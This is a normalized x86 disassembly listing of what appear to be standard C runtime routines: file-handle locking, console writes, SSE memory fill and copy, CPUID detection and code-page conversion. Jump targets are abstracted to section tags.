cmp [ ebp - 0x1c ] esi
je r-xdata
retn
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ edi ]
call sub_2022631
pop ecx
mov eax [ edi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_2022104
mov edi edi
push ebp
mov ebp esp
push ecx
or [ ebp - 0x4 ] 0xffffffff
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2022038
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
or eax 0xffffffff
leave
retn
sub_2022136
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_2022038
add esp 0x18
pop ebp
retn
sub_2022156
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_20201f8
add esp 0xc
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
push esi
mov esi [ ebp + 0xc ]
cmp esi ebx
jne r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx ax [ eax ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx ax
movzx eax cl
test [ eax + edi + 0x1d ] 0x4
je r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ax [ esi ]
movzx eax ax
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp ax cx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
cmp al bl
jne r-xdata
movzx eax [ esi ]
xor ecx ecx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
pop esi
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp cx bx
je r-xdata
mov dl [ esi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
xor eax eax
jmp r-xdata
shl ecx 0x8
movzx ax al
or cx ax
inc [ ebp + 0x8 ]
movzx ecx cx
xor ecx ecx
jmp r-xdata
movzx eax ax
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
movzx dx dl
shl eax 0x8
or ax dx
inc esi
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_20222dc
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_20222fc
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_200b53e
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_2022341
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_2022341
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_20222fc
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_20223f1
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_2022410
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_20223f1
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_2022413
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
jl r-xdata
call sub_200fb13
mov [ eax ] 0x9
call sub_200fb26
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_2022494
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_200fb13
mov [ eax ] 0x9
call sub_200fb26
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_202251a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_200fb26
and [ eax ] 0x0
call sub_200fb13
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_200fb26
mov [ eax ] esi
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rw-data ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_2022591
push 0xc
push r--data
call sub_200db54
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_200db99
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2022628
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_2019192
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_2022631
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_2022658
push 0x18
push r--data
call sub_200db54
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_2010d79
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20227e9
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_200db99
retn
push 0x40
push 0x20
call sub_201a9e3
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_2022591
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_2010e3c
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_202272b
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_2019192
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_20227f2
push 0xc
push r--data
call sub_200db54
xor edi edi
mov [ ebp - 0x1c ] edi
xor bl bl
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x4000
je r-xdata
add bl 0x20
test [ ebp + 0xc ] 0x80
je r-xdata
or bl 0x80
push [ ebp + 0x8 ]
call [ GetFileType@IAT ]
cmp eax edi
jne r-xdata
or bl 0x10
cmp eax 0x2
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_200fb39
pop ecx
cmp eax 0x3
jne r-xdata
or bl 0x40
jmp r-xdata
call sub_2022658
mov esi eax
mov [ ebp + 0xc ] esi
cmp esi 0xffffffff
jne r-xdata
or bl 0x8
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
push esi
call sub_2022413
pop ecx
pop ecx
or bl 0x1
mov eax esi
sar eax 0x5
lea ecx [ eax * 4 + rw-data ]
mov eax esi
and eax 0x1f
shl eax 0x6
mov edx [ ecx ]
mov [ edx + eax + 0x4 ] bl
mov edx [ ecx ]
lea edx [ edx + eax + 0x24 ]
and [ edx ] 0x80
mov ecx [ ecx ]
lea eax [ ecx + eax + 0x24 ]
and [ eax ] 0x7f
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20228e0
cmp [ ebp - 0x1c ] edi
je r-xdata
call sub_200fb13
mov [ eax ] 0x18
call sub_200fb26
mov [ eax ] edi
jmp r-xdata
or eax 0xffffffff
mov eax esi
jmp r-xdata
call sub_200db99
retn
sub_20228e0
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_2022631
pop ecx
retn
mov eax esi
sar eax 0x5
mov ecx esi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + ecx + 0x4 ]
and [ eax ] 0xfe
sub_2022908
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_202295f
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_202295f
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_2022908
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_2022a3e
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_20229ee
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_2022aad
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_2024be6
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_200b53e
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_2022b72
push 0x10
push r--data
call sub_200db54
xor esi esi
mov [ ebp - 0x20 ] esi
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_2024c32
mov [ ebp - 0x1c ] eax
push 0x3
call sub_2010e3c
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
call sub_200fb26
mov [ eax ] esi
call sub_200fb13
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2022c08
mov eax [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
add [ ebp + 0x8 ] 0x2
push eax
call sub_2022aad
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
call sub_200db99
retn
mov eax [ ebp - 0x1c ]
dec [ ebp - 0x1c ]
test eax eax
je r-xdata
or [ ebp - 0x20 ] 0xffffffff
sub_2022c11
push 0xc
push r--data
call sub_200db54
push 0x3
call sub_2010e3c
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_2022aad
pop ecx
movzx eax ax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2022c4e
mov ax [ ebp - 0x1c ]
call sub_200db99
retn
sub_2022c57
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_2014595
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_200fb13
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_2022d90
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_2022dbb
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_2022e42
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_2022e42
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_2022dbb
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_2022f25
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_200a046
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_200b53e
leave
retn
sub_2022f6e
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_200b53e
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_2013580
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_201418b
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_2009eef
pop ecx
cmp eax edi
je r-xdata
call sub_2023130
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_2016140
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_201a9e3
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
